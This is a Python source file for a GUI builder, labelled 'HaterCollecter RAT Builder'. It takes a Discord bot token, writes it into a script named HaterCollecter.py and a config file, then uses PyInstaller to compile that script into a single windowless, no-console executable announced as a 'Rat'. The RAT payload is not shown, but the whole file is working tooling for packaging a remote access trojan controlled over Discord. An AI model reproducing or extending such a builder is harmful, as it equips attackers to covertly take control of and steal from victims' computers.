# Created by 0nsec
# 28-sep-2024
# A python based UI based Builder 

import os
import json
import customtkinter as ctk
from tkinter import messagebox
import PyInstaller.__main__

# Function to write the token to config.json
def save_token_to_config(token):
    try:
        config_data = {
            "token": token
        }
        # Create config.json and write the token
        with open('config.json', 'w') as config_file:
            json.dump(config_data, config_file, indent=4)
        log_message("[+] Token saved in config.json successfully!")
    except Exception as e:
        log_message(f"Failed to save token: {e}")
        messagebox.showerror("Error", f"Failed to save token: {e}")

# Function to update the HaterCollecter.py file with the new token
def update_hatercollector_script(token):
    try:
        with open('HaterCollecter.py', 'r') as file:
            lines = file.readlines()

        token_updated = False
        for i, line in enumerate(lines):
            if line.startswith("token ="):
                lines[i] = f'token = "{token}"\n'
                token_updated = True

        # If token not found, append it
        if not token_updated:
            lines.append(f'\ntoken = "{token}"\n')

        with open('HaterCollecter.py', 'w') as file:
            file.writelines(lines)
        
        log_message("[+] HaterCollecter.py updated with the new token.")
    except Exception as e:
        log_message(f"Failed to update HaterCollecter.py: {e}")
        messagebox.showerror("Error", f"Failed to update HaterCollecter.py: {e}")

# Function to build the executable using PyInstaller
def build_exe():
    try:
        # Log the build process
        log_message("[+] Starting the build process...")
        
        # Call PyInstaller to build HaterCollecter.py
        PyInstaller.__main__.run([
            '--onefile',
            '--windowed',
            '--noconsole',
            'HaterCollecter.py',  # Hardcoded script
            '--distpath', 'dist'  # Hardcoded output directory
        ])
        
        log_message("[+] Build completed! Rat created in 'dist' folder.")
        messagebox.showinfo("Success", "Build completed! Rat created in 'dist' folder.")
    except Exception as e:
        log_message(f"An error occurred during the build: {e}")
        messagebox.showerror("Error", f"An error occurred during the build: {e}")

# Function to handle the build process
def start_build():
    token = token_entry.get()

    if not token:
        log_message("Error: Discord token not provided.")
        messagebox.showerror("Error", "Please enter a Discord token.")
        return
    
    # Save the token to config.json
    save_token_to_config(token)
    
    # Update HaterCollecter.py with the new token
    update_hatercollector_script(token)
    
    # Build the executable
    build_exe()

# Function to update the log view
def log_message(message):
    log_textbox.configure(state="normal")  # Enable editing to append
    log_textbox.insert("end", f"{message}\n")
    log_textbox.see("end")  # Scroll to the end
    log_textbox.configure(state="disabled")  # Disable editing again

# Initialize CustomTkinter and set theme
ctk.set_appearance_mode("dark")  # Can be "light", "dark", or "system"
ctk.set_default_color_theme("blue")  # CustomTkinter themes: "blue", "green", "dark-blue"

# Create the main application window
app = ctk.CTk()
app.title("HaterCollecter RAT Builder By 0nsec")
app.geometry("500x400")
app.resizable(False, False)

# Frame to hold the content
frame = ctk.CTkFrame(master=app, corner_radius=15)
frame.pack(pady=20, padx=20, fill="both", expand=True)

# Title label for the builder
title_label = ctk.CTkLabel(master=frame, text="HaterCollecter Rat Builder", font=("Arial", 20, "bold"))
title_label.pack(pady=10)

# Label and entry for Discord token
token_label = ctk.CTkLabel(master=frame, text="Enter Discord Bot Token:", font=("Arial", 14, "bold"))
token_label.pack(pady=10)

token_entry = ctk.CTkEntry(master=frame, width=300, height=30)
token_entry.pack(pady=10)

# Build button to trigger the build process & You can also change the color of the button
build_button = ctk.CTkButton(master=frame, text="Build", command=start_build, width=200, height=40, 
                             font=("Arial", 12, "bold"), fg_color="#DE3163", hover_color="#DE3163")
build_button.pack(pady=10)

# Log View - Readonly Textbox
log_label = ctk.CTkLabel(master=frame, text="Build Log:", font=("Arial", 12, "bold"))
log_label.pack(pady=10)

log_textbox = ctk.CTkTextbox(master=frame, width=400, height=120, font=("Arial", 10))
log_textbox.pack(pady=10)
log_textbox.configure(state="disabled")  # Make the log view read-only

# Run the application
app.mainloop()
